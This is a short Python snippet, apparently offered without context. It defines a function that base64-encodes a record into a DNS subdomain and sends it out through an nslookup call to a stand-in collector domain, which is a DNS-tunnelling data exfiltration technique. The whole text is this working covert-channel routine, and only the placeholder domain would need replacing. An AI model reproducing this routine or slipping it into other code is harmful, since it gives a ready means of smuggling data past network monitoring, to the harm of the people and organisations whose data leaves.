import base64,subprocess

def send_record(record):
    label=base64.urlsafe_b64encode(record).decode()
    subprocess.run(['nslookup',label+'.collector.invalid'])
